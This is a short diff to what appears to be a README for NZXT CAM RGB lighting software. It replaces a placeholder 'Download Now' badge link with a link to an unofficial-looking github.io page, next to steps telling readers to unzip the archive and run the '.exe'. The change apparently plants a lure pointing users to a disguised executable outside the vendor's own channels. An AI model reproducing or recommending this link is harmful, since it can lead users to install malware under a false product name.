@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://nzxt-cam-download.github.io/.github/)
 
 ## 📸 Overview
 ![nzxt-cam-rgb-lighting](https://github.com/user-attachments/assets/6b35f1b8-199d-4409-acab-7af1f7894f3b)
